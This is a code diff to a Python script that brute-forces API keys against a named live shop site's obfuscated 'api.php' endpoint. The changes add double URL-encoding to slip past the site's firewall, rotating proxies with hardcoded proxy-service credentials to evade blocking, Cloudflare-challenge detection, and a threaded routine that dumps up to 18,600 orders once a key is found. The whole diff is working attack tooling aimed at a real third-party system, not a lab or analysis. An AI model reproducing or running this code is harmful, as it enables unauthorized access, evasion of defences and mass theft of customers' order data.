@@ -1,5 +1,6 @@
 #!/usr/bin/env python3
-"""fffzz.lol %61pi.php API key brute — fast: per-worker proxy, stream keys, single param."""
+"""Faka %61pi.php API key brute — requests pool + per-worker proxy."""
+import fcntl
 import json
 import os
 import subprocess
@@ -11,10 +12,22 @@ from datetime import datetime
 from pathlib import Path
 from urllib.parse import quote
 
+import requests
+import urllib3
+from requests.adapters import HTTPAdapter
+
+urllib3.disable_warnings()
+
 BASE = os.environ.get("FAKA_BASE", "https://fffzz.lol/shop/")
 if not BASE.endswith("/"):
     BASE += "/"
-API = BASE + "%61pi.php"
+# curl keeps %61pi.php; requests needs double-encoding to avoid WAF decode
+API_CURL = BASE + "%61pi.php"
+API_REQ = BASE + "%2561pi.php"
+
+
+def api_path():
+    return API_CURL if DIRECT else API_REQ
 OUT = Path(sys.argv[6]) if len(sys.argv) > 6 else Path(os.environ.get("FAKA_OUT", "/workspace/results/fffzz.lol/kami_allin_20260717"))
 OUT.mkdir(parents=True, exist_ok=True)
 JAR = str(OUT / f".cookies_api_w{int(sys.argv[5]) if len(sys.argv) > 5 else 0}")
@@ -22,6 +35,7 @@ UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0"
 HITS = OUT / "KAMI_HIT.jsonl"
 FOUND_KEY = OUT / "API_KEY_FOUND.txt"
 PROGRESS = OUT / "api_brute_progress.json"
+PROGRESS_LOCK = OUT / ".progress.lock"
 LOCK = threading.Lock()
 WID = int(sys.argv[5]) if len(sys.argv) > 5 else 0
 LOG = open(OUT / f"api_brute_w{WID}.log", "a", buffering=1)
@@ -29,9 +43,15 @@ QG_KEY = os.environ.get("QG_AUTHKEY", "C413ED6D")
 QG_PWD = os.environ.get("QG_AUTHPWD", "344F550A6F8B")
 PROXY = ""
 PROXY_AT = 0
-CURL_N = 0
-CURL_TIMEOUT = os.environ.get("FFFZZ_TIMEOUT", "5" if os.environ.get("FFFZZ_TURBO") else "8")
+PROXY_VER = 0
+REQ_N = 0
 TURBO = bool(os.environ.get("FFFZZ_TURBO"))
+DIRECT = bool(os.environ.get("FAKA_DIRECT"))
+CURL_TIMEOUT = os.environ.get("FFFZZ_TIMEOUT", "3" if TURBO else "8")
+FAST_KEY = bool(os.environ.get("FAKA_FAST_KEY", "1" if TURBO else ""))
+BATCH_SIZE = int(os.environ.get("FAKA_BATCH", "8000" if TURBO else "800"))
+TAIL_SKIP = int(os.environ.get("FAKA_TAIL_SKIP", "10000"))
+_thread_local = threading.local()
 
 
 def log(msg):
@@ -45,7 +65,10 @@ def is_waf(body):
     if not body:
         return True
     b = body.lower()
-    return any(x in b for x in ("_guard/html.js", "slider_html", "cf-chl", "just a moment", "access denied"))
+    return any(x in b for x in (
+        "_guard/html.js", "slider_html", "cf-chl", "just a moment", "access denied",
+        "404 not found", "<!doctype html", "cloudflare",
+    ))
 
 
 def is_auth_prompt(body):
@@ -64,13 +87,24 @@ def proxy_slot():
     return WID % 20 if WID >= 20 else WID
 
 
+def bump_proxy():
+    global PROXY_VER
+    PROXY_VER += 1
+    if hasattr(_thread_local, "session"):
+        del _thread_local.session
+        del _thread_local.proxy_ver
+
+
 def fetch_proxy():
     global PROXY, PROXY_AT
     pf = OUT / f"proxy_w{proxy_slot()}.txt"
-    if pf.exists() and time.time() - pf.stat().st_mtime < 140:
-        PROXY = pf.read_text().strip()
-        PROXY_AT = pf.stat().st_mtime
-        if PROXY:
+    if pf.exists():
+        new = pf.read_text().strip()
+        if new:
+            if new != PROXY:
+                PROXY = new
+                PROXY_AT = pf.stat().st_mtime
+                bump_proxy()
             return True
     urls = [
         f"https://share.proxy.qg.net/query?key={QG_KEY}&pwd={QG_PWD}",
@@ -90,6 +124,7 @@ def fetch_proxy():
             PROXY = f"http://{QG_KEY}:{QG_PWD}@{server}"
             PROXY_AT = time.time()
             pf.write_text(PROXY)
+            bump_proxy()
             return True
         except Exception:
             continue
@@ -99,63 +134,113 @@ def fetch_proxy():
 def ensure_proxy():
     global PROXY, PROXY_AT
     pf = OUT / f"proxy_w{proxy_slot()}.txt"
-    if pf.exists() and time.time() - pf.stat().st_mtime < 140:
-        PROXY = pf.read_text().strip()
-        PROXY_AT = pf.stat().st_mtime
-        if PROXY:
+    if pf.exists():
+        new = pf.read_text().strip()
+        if new:
+            if new != PROXY:
+                PROXY = new
+                PROXY_AT = pf.stat().st_mtime
+                bump_proxy()
+            else:
+                PROXY = new
+                PROXY_AT = pf.stat().st_mtime
             return
     shared = Path("/data/config/proxy.env")
     if shared.exists():
         for line in shared.read_text().splitlines():
             if line.startswith("PROXY_URL="):
-                PROXY = line.split("=", 1)[1].strip().strip('"')
-                PROXY_AT = shared.stat().st_mtime
+                new = line.split("=", 1)[1].strip().strip('"')
+                if new != PROXY:
+                    PROXY = new
+                    PROXY_AT = shared.stat().st_mtime
+                    bump_proxy()
                 return
     if not PROXY or time.time() - PROXY_AT > 140:
         fetch_proxy()
 
 
-def curl(url, retry=1 if TURBO else 2):
-    global CURL_N
-    CURL_N += 1
-    if CURL_N % 80 == 1 or not PROXY:
-        ensure_proxy()
-    proxies = [PROXY] if PROXY else []
-    if not TURBO or os.environ.get("FAKA_DIRECT"):
-        proxies.append(None)
-    for px in proxies:
+def get_session():
+    if getattr(_thread_local, "proxy_ver", -1) != PROXY_VER:
+        s = requests.Session()
+        s.headers.update({
+            "User-Agent": UA,
+            "Referer": BASE,
+            "X-Requested-With": "XMLHttpRequest",
+        })
+        adapter = HTTPAdapter(pool_connections=4, pool_maxsize=4, max_retries=0)
+        s.mount("http://", adapter)
+        s.mount("https://", adapter)
+        if PROXY:
+            s.proxies = {"http": PROXY, "https": PROXY}
+        _thread_local.session = s
+        _thread_local.proxy_ver = PROXY_VER
+    return _thread_local.session
+
+
+def http_get(url, retry=None):
+    global REQ_N
+    retry = 1 if retry is None and TURBO else (retry if retry is not None else 2)
+    REQ_N += 1
+    if DIRECT:
+        url = url.replace("%2561pi.php", "%61pi.php")
+        cmd = ["curl", "-sk", f"--max-time", CURL_TIMEOUT, "-b", JAR, "-c", JAR, "-A", UA,
+               "-H", f"Referer: {BASE}", "-H", "X-Requested-With: XMLHttpRequest", url]
         for attempt in range(retry):
-            cmd = ["curl", "-sk", f"--max-time", CURL_TIMEOUT, "-b", JAR, "-c", JAR, "-A", UA,
-                   "-H", f"Referer: {BASE}", "-H", "X-Requested-With: XMLHttpRequest", url]
-            if px:
-                cmd = ["curl", "-x", px, "-sk", f"--max-time", CURL_TIMEOUT, "-b", JAR, "-c", JAR, "-A", UA,
-                       "-H", f"Referer: {BASE}", "-H", "X-Requested-With: XMLHttpRequest", url]
             try:
-                r = subprocess.run(cmd, capture_output=True, text=True, timeout=int(CURL_TIMEOUT) + 2).stdout or ""
-                if is_auth_prompt(r) or (r.strip() and not is_waf(r)):
-                    return r
-                if (not r.strip() or is_waf(r)) and px:
-                    fetch_proxy()
-                    time.sleep(0.5 + attempt * 0.5)
+                body = subprocess.run(
+                    cmd, capture_output=True, text=True, timeout=int(CURL_TIMEOUT) + 2,
+                ).stdout or ""
+                if is_auth_prompt(body) or is_success(body):
+                    return body
             except Exception:
+                time.sleep(0.05)
+        return ""
+    if REQ_N % 300 == 1 or not PROXY:
+        ensure_proxy()
+    timeout = float(CURL_TIMEOUT)
+    for attempt in range(retry):
+        try:
+            sess = get_session()
+            if PROXY:
+                sess.proxies = {"http": PROXY, "https": PROXY}
+            r = sess.get(url, timeout=timeout, verify=False)
+            body = r.text or ""
+            if is_auth_prompt(body) or is_success(body):
+                return body
+            if (not body.strip() or is_waf(body)) and attempt + 1 >= retry:
                 fetch_proxy()
-                time.sleep(0.3)
+        except Exception:
+            fetch_proxy()
+            if attempt + 1 < retry:
+                time.sleep(0.05)
     return ""
 
 
 def wait_for_site():
+    global PROXY, PROXY_AT
     attempts = 0
     while True:
         attempts += 1
-        ensure_proxy()
-        log(f"probe proxy {PROXY.split('@')[-1] if PROXY else 'none'}")
-        curl(BASE, retry=1)
-        body = curl(f"{API}/?act=search&id=1", retry=4 if TURBO else 2)
-        if body:
+        if not DIRECT:
+            ensure_proxy()
+        mode = "direct" if DIRECT else (PROXY.split("@")[-1] if PROXY else "none")
+        log(f"probe {mode}")
+        http_get(BASE, retry=1)
+        body = http_get(f"{api_path()}/?act=search&id=1", retry=3)
+        if is_auth_prompt(body) or is_success(body):
             log(f"site up {body[:80]}")
             return
-        fetch_proxy()
-        wait = 5 if TURBO else 15
+        if DIRECT:
+            wait = 2
+        else:
+            alt = OUT / f"proxy_w{(proxy_slot() + attempts) % 20}.txt"
+            if alt.exists():
+                PROXY = alt.read_text().strip()
+                PROXY_AT = alt.stat().st_mtime
+                bump_proxy()
+            else:
+                fetch_proxy()
+            wait = 3 if TURBO else 15
         log(f"site down, retry {wait}s (attempt {attempts})")
         time.sleep(wait)
 
@@ -170,33 +255,40 @@ def load_progress():
 
 
 def save_progress(offset, tested, rate=0):
-    data = load_progress()
-    data[str(WID)] = {
-        "offset": offset, "tested": tested,
-        "rate": round(rate, 1),
-        "ts": datetime.now().isoformat(),
-    }
-    PROGRESS.write_text(json.dumps(data, indent=2))
+    PROGRESS_LOCK.parent.mkdir(parents=True, exist_ok=True)
+    PROGRESS_LOCK.touch(exist_ok=True)
+    with open(PROGRESS_LOCK, "r+") as lk:
+        fcntl.flock(lk, fcntl.LOCK_EX)
+        try:
+            data = load_progress()
+            data[str(WID)] = {
+                "offset": offset, "tested": tested,
+                "rate": round(rate, 1),
+                "ts": datetime.now().isoformat(),
+            }
+            PROGRESS.write_text(json.dumps(data, indent=2))
+        finally:
+            fcntl.flock(lk, fcntl.LOCK_UN)
 
 
 def try_key(key):
-    body = curl(f"{API}/?act=search&id=1&key={quote(key, safe='')}")
+    body = http_get(f"{api_path()}/?act=search&id=1&key={quote(key, safe='')}")
     if is_success(body):
         return "key", key, body
-    if body and not is_auth_prompt(body) and not is_waf(body):
+    if not FAST_KEY and body and not is_auth_prompt(body) and not is_waf(body):
         for param in ("api_key", "token", "apikey"):
-            body2 = curl(f"{API}/?act=search&id=1&{param}={quote(key, safe='')}")
+            body2 = http_get(f"{api_path()}/?act=search&id=1&{param}={quote(key, safe='')}")
             if is_success(body2):
                 return param, key, body2
     return None
 
 
-def dump_orders(api_key, param="key", max_id=18600, workers=15):
+def dump_orders(api_key, param="key", max_id=18600, workers=20):
     log(f"DUMP {param}={api_key[:20]}")
     results = []
 
     def fetch(oid):
-        body = curl(f"{API}/?act=search&id={oid}&{param}={quote(api_key, safe='')}")
+        body = http_get(f"{api_path()}/?act=search&id={oid}&{param}={quote(api_key, safe='')}")
         return (oid, body) if is_success(body) else None
 
     with ThreadPoolExecutor(workers) as ex:
@@ -215,7 +307,7 @@ def dump_orders(api_key, param="key", max_id=18600, workers=15):
     log(f"DUMP done {len(results)}")
 
 
-def iter_key_batches(wl, start, limit, batch_size=4000 if TURBO else 800):
+def _iter_batches_enumerate(wl, start, limit, batch_size):
     batch, pos = [], start
     with wl.open(encoding="utf-8", errors="ignore") as f:
         for i, line in enumerate(f):
@@ -235,6 +327,38 @@ def iter_key_batches(wl, start, limit, batch_size=4000 if TURBO else 800):
         yield pos, batch
 
 
+def _iter_batches_tail(wl, start, limit, batch_size):
+    cmd = ["tail", "-n", f"+{start + 1}", str(wl)]
+    proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, text=True, bufsize=1 << 20)
+    batch, pos, read = [], start, 0
+    try:
+        for line in proc.stdout:
+            if limit and read >= limit:
+                break
+            read += 1
+            k = line.strip()
+            pos = start + read
+            if not (1 <= len(k) <= 128):
+                continue
+            batch.append(k)
+            if len(batch) >= batch_size:
+                yield pos, batch
+                batch = []
+    finally:
+        proc.stdout.close()
+        proc.wait()
+    if batch:
+        yield pos, batch
+
+
+def iter_key_batches(wl, start, limit, batch_size=None):
+    batch_size = batch_size or BATCH_SIZE
+    if start >= TAIL_SKIP:
+        yield from _iter_batches_tail(wl, start, limit, batch_size)
+    else:
+        yield from _iter_batches_enumerate(wl, start, limit, batch_size)
+
+
 def main():
     wl = Path(sys.argv[1]) if len(sys.argv) > 1 else Path("/data/wordlists/faka/faka-tokens.txt")
     start = int(sys.argv[2]) if len(sys.argv) > 2 else 0
@@ -246,14 +370,15 @@ def main():
     if str(WID) in prog:
         p = prog[str(WID)]
         saved = p.get("offset", 0)
-        end = start + limit if limit else saved + 1
         if saved >= start and (not limit or saved < start + limit):
             start = saved
             tested = p.get("tested", 0)
             log(f"resume offset={start} tested={tested}")
 
-    fetch_proxy()
-    log(f"proxy {PROXY.split('@')[-1] if PROXY else 'none'}")
+    if not DIRECT:
+        fetch_proxy()
+        ensure_proxy()
+    log(f"proxy {'direct' if DIRECT else (PROXY.split('@')[-1] if PROXY else 'none')} turbo={TURBO} threads={workers} batch={BATCH_SIZE} timeout={CURL_TIMEOUT}")
     wait_for_site()
 
     t0 = time.time()
